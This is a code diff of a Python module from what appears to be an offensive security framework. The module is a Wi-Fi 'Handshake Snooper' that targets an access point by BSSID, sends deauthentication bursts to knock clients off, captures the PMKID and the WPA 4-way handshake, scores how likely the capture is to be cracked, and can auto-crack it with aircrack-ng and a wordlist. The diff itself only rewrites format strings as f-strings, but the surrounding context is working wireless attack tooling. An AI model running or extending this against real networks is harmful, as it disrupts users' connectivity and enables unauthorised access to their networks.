@@ -179,7 +179,7 @@ class Exploit(Exploit):
             filter_file.write_text(self.target_bssid + "\n", encoding="utf-8")
             cmd.extend(["--filterlist_ap", str(filter_file), "--filtermode=2"])
 
-        print_status("PMKID-first attempt ({}s)...".format(self.pmkid_timeout))
+        print_status(f"PMKID-first attempt ({self.pmkid_timeout}s)...")
         try:
             subprocess.run(cmd, timeout=int(self.pmkid_timeout), check=False)
         except subprocess.TimeoutExpired:
@@ -188,7 +188,7 @@ class Exploit(Exploit):
             return None
 
         if cap_file.exists() and cap_file.stat().st_size > 0:
-            print_success("PMKID-first capture produced: {}".format(cap_file))
+            print_success(f"PMKID-first capture produced: {cap_file}")
             return cap_file
         return None
 
@@ -300,12 +300,11 @@ class Exploit(Exploit):
 
                 if all(handshake_state[key][m] for m in ("M1", "M2", "M3", "M4")):
                     print_success(
-                        "Complete 4-way handshake: bssid={} client={}".format(bssid, client)
+                        f"Complete 4-way handshake: bssid={bssid} client={client}"
                     )
                     found_event.set()
 
-        print_status("Scapy EAPOL sniff on {} (timeout: {}s)...".format(
-            self.interface, self.capture_timeout))
+        print_status(f"Scapy EAPOL sniff on {self.interface} (timeout: {self.capture_timeout}s)...")
         try:
             sniff(
                 iface=str(self.interface),
@@ -365,14 +364,14 @@ class Exploit(Exploit):
         time.sleep(3)
 
         for round_num in range(int(self.deauth_rounds)):
-            print_status("Deauth burst {}/{}...".format(round_num + 1, self.deauth_rounds))
+            print_status(f"Deauth burst {round_num + 1}/{self.deauth_rounds}...")
             if bool(self.native_deauth):
                 self._send_deauth_native(int(self.deauth_count))
             else:
                 self._send_deauth_aireplay(int(self.deauth_count))
             time.sleep(5)
 
-        print_info("Waiting for handshake (max {}s)...".format(self.capture_timeout))
+        print_info(f"Waiting for handshake (max {self.capture_timeout}s)...")
         start = time.time()
         cap_file: Optional[Path] = None
 
@@ -381,7 +380,7 @@ class Exploit(Exploit):
             for cf in caps:
                 if self._verify_handshake(cf):
                     cap_file = cf
-                    print_success("Valid handshake captured: {}".format(cf))
+                    print_success(f"Valid handshake captured: {cf}")
                     break
             if cap_file:
                 break
@@ -404,11 +403,11 @@ class Exploit(Exploit):
                     ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                 ).decode("utf-8", "replace")
                 if "Monitor" in out:
-                    return "Interface {} is in Monitor mode - prerequisites OK".format(iface)
+                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                 if "no wireless extensions" not in out.lower():
                     return (
-                        "Interface {} found but NOT in Monitor mode"
-                        " - run airmon-ng start {}".format(iface, iface)
+                        f"Interface {iface} found but NOT in Monitor mode"
+                        f" - run airmon-ng start {iface}"
                     )
             except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                 pass
@@ -418,12 +417,12 @@ class Exploit(Exploit):
                     ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                 ).decode("utf-8", "replace")
                 if str(iface) in out:
-                    return "Interface {} detected via iw - verify monitor mode".format(iface)
+                    return f"Interface {iface} detected via iw - verify monitor mode"
             except Exception:
                 pass
         return (
-            "Interface {} not found"
-            " - connect wireless adapter and enable monitor mode".format(iface)
+            f"Interface {iface} not found"
+            " - connect wireless adapter and enable monitor mode"
         )
 
     def run(self) -> None:
@@ -437,7 +436,7 @@ class Exploit(Exploit):
         output = Path(str(self.output_dir))
         output.mkdir(parents=True, exist_ok=True)
         bssid_clean = str(self.target_bssid).replace(":", "")
-        cap_prefix  = output / "handshake_{}".format(bssid_clean)
+        cap_prefix  = output / f"handshake_{bssid_clean}"
 
         if bool(self.dry_run):
             capture_method = (
@@ -449,13 +448,11 @@ class Exploit(Exploit):
                 else "Scapy Dot11Deauth"
             )
             print_info("DRY RUN - Handshake Snooper workflow:")
-            print_info("  Capture : {}".format(capture_method))
-            print_info("  Deauth  : {} x {} burst(s) of {} frame(s)".format(
-                deauth_method, self.deauth_rounds, self.deauth_count))
+            print_info(f"  Capture : {capture_method}")
+            print_info(f"  Deauth  : {deauth_method} x {self.deauth_rounds} burst(s) of {self.deauth_count} frame(s)")
             print_info("  Verify  : aircrack-ng")
             if bool(self.use_airodump):
-                print_info("  Command : airodump-ng --bssid {} -c {} -w {} {}".format(
-                    self.target_bssid, self.target_channel, cap_prefix, self.interface))
+                print_info(f"  Command : airodump-ng --bssid {self.target_bssid} -c {self.target_channel} -w {cap_prefix} {self.interface}")
             return
 
         if not shutil.which("aircrack-ng"):
@@ -473,14 +470,14 @@ class Exploit(Exploit):
         if _pmkid:
             print_info("PMKID capture available; proceeding to handshake workflow.")
 
-        print_status("Starting handshake capture for {}...".format(self.target_bssid))
+        print_status(f"Starting handshake capture for {self.target_bssid}...")
 
         cap_file: Optional[Path] = None
 
         if bool(self.use_airodump):
             cap_file = self._capture_eapol_airodump(cap_prefix)
         else:
-            scapy_cap_file = output / "handshake_{}.pcapng".format(bssid_clean)
+            scapy_cap_file = output / f"handshake_{bssid_clean}.pcapng"
             capture_result: Dict[str, object] = {"success": False, "done": False}
 
             def _worker() -> None:
@@ -494,7 +491,7 @@ class Exploit(Exploit):
             for round_num in range(int(self.deauth_rounds)):
                 if capture_result.get("done"):
                     break
-                print_status("Deauth burst {}/{}...".format(round_num + 1, self.deauth_rounds))
+                print_status(f"Deauth burst {round_num + 1}/{self.deauth_rounds}...")
                 if bool(self.native_deauth):
                     self._send_deauth_native(int(self.deauth_count))
                 else:
@@ -511,10 +508,10 @@ class Exploit(Exploit):
             return
 
         if self._verify_handshake(cap_file):
-            print_success("Valid handshake verified: {}".format(cap_file))
+            print_success(f"Valid handshake verified: {cap_file}")
         else:
             print_info(
-                "Capture written but verification incomplete: {}".format(cap_file)
+                f"Capture written but verification incomplete: {cap_file}"
             )
 
         if bool(self.ml_score) and _HAS_ML:
@@ -529,9 +526,7 @@ class Exploit(Exploit):
                 }
                 score = scorer.score(features)
                 print_info(
-                    "ML Handshake Score: quality={}/100  completeness={}  crack_prob={:.0%}".format(
-                        score.quality, score.completeness, score.crack_probability
-                    )
+                    f"ML Handshake Score: quality={score.quality}/100  completeness={score.completeness}  crack_prob={score.crack_probability:.0%}"
                 )
                 if score.quality < 50:
                     print_info("Low quality - consider re-capturing.")
@@ -539,7 +534,7 @@ class Exploit(Exploit):
                 logger.debug("ML scoring failed: %s", exc)
 
         if bool(self.auto_crack) and self.wordlist:
-            print_status("Auto-cracking with {}...".format(self.wordlist))
+            print_status(f"Auto-cracking with {self.wordlist}...")
             subprocess.run(
                 [
                     "aircrack-ng", "-w", str(self.wordlist),
